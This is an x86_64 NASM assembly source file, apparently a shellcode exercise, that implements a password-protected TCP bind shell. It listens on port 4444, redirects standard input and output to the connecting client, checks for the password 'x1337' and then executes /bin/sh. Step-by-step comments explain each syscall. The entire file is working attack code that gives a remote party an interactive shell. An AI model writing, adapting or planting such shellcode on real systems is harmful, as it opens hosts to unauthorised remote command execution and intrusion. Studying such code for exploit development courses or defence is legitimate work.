global _start
; Developer : reg1reg1
; TCP bindshell code
; NASM x86_64 intel
section .text
_start:	
	;Resetting the register
	cld
	
	xor rax,rax
	mov rsi,rax
	mov rdi,rsi
	mov rdx,rdi
	mov r8,rdx
	mov rcx,r8
	mov rbx,rcx
	;Step1: Create a socket using the socket syscall
	;format of the socket call as displayed by man socket
	; int socket(int domain, int type, int protocol)
	; Domain AF_INET (Internet, local processes use AF_UNIX)	has integer value 2
	; Type can SOCK_STREAM (TCP) or DGRAM (UDP), this has integer value 1
	; Protocol number is 0 for INANYADDR
	; The socket object fd(file descriptor) is returned and stored in rax
	; Syscall of socket for x86 is 41 (can be found in unistd.h or looked up online)
	
	xor rax,rax
	mov rdx,rax
	mov al,41
	mov dil,2
	mov sil,1
	syscall
	
	;move returned value of rax to rdi, this will be the first arg in most syscalls that follow
	mov rdi,rax ;Do not touch rdi 
	
	; The tricky part
	; Step2: Call the bind syscall
	; Its format is as below (man bind)
	; int bind(int sockfd, const struct sockaddr *addr,socklen_t addrlen)
	
	; We need to create a structure, with the following form 
	; Pushing less than 8 bytes onto stack may leave null appended characters so we will,
	; use mov and then decrement rsp (stack in x86 grows downwards (high ->low)) 
	; structure of sockaddr is as under
	; server.sin_family = AF_INET; 1st in seq
	; server.sin_port = htons(port); 2nd in seq
	; server.sin_addr.s_addr = INADDR_ANY; 3rd in seq
	; bzero(&server.sin_zero, 8); 4th in seq
	; It is a stack so pushing will be done in reverse order
	;bzero is 8 zeros
	xor rax,rax
	push rax
	
	;INADDR_ANY is 0, and it has size 4 bytes in struct (int in C)
	mov dword [rsp-4],eax
	;port number to bind to, must be in bigendian(network byte) (2 bytes), 4444 will be 0x5c11
	mov word [rsp-6],0x5c11
	;this argument is	also 2 bytes long
	mov word [rsp-8],0x2
	;4+2+2=8 bytes,decrement rsp by 8
	sub rsp,8
	;this is the address to be referred by the rsi
	mov rsi,rsp
	;Also syscall for bind is 49
	mov al,49
	;rdx has len of socket_addr struct (including bzero),is 8+8 16 bytes
	mov dl,16
	syscall
	;Step3: Listen
	;Format as revealed by man listen
	;int listen(int sockfd, int backlog);
	; backlog is size of client queue making it 2 (more than 1 will not be needed)
	;Syscall number 50
	xor rax,rax
	mov rsi,rax
	mov al,50
	mov sil,2
	syscall
	
	;Step4:Accept
	;Format as revealed by man 2 accept
	;int accept(int sockfd, struct sockaddr *addr, socklen_t *addrlen)
	;This is a blocking syscall which waits for the client
	;Here we do not fill the 2nd argument is filled by the call when a client connects
	;but we reserve space for it
	;Syscall 43
	;note that here we need the address ot the (*addrlen) in rdx
	;We can also use relative addressing
	
	mov al,43
	sub rsp,16
	mov rsi,rsp
	mov byte [rsp-1],16
	sub rsp,1
	mov rdx,rsp
	syscall
	
	mov r8,rax
	;close fd,syscall no 3
	xor rax,rax
	mov al,3
	syscall
	;Step 5 Call dup2 syscall to copy this filedescritor to all 3 streams


	; duplicate socket
	; basically the std in ,stdout of the server will be replaced by whatever the client types
	; calling syscall dup2
	; syscall num 33
	; rsi must have fd num value to be replaced
	; dup(new,old)
	xor rax,rax
	mov rsi,rax
	mov rdi,r8
	mov al,33
	syscall
	
	xor rax,rax
	mov al,33
	add sil,1
	syscall
	
	xor rax,rax
	mov al,33
        add sil,1
        syscall
;Reading password input from user

	xor rax,rax
	jmp l2
	;garbage instructions
	xor rax,rax
	xor rax,rax
	inp: db "xxxxxxxx"	
	;Reading Input
l2:
	mov dil,al
	lea rsi,[rel inp]
	mov dl,64
	syscall
	
	jmp l3
	p1: db "x1337"
l3:
	lea rsi,[rel inp]
	lea rdi,[rel p1]
	mov bl,6
	sub bl,al
	js exiting
	xor rcx,rcx
	mov cl,5
	rep cmpsb 
	jz ExecCall
exiting:
	;ExitSyscall	
	xor rax,rax
	mov al,60
	mov dil,0
	syscall
	;Compare string
	;Call Execve

ExecCall:
	xor rax,rax
	lea rdi, [rel hw]
	mov [rdi+7], byte al
	mov [rdi+8], rdi
	mov [rdi+16],rax
	
	lea rsi,[rdi+8]
	lea rdx,[rdi+16]
	mov al,59
	syscall
	
	hw: db "/bin/sh"
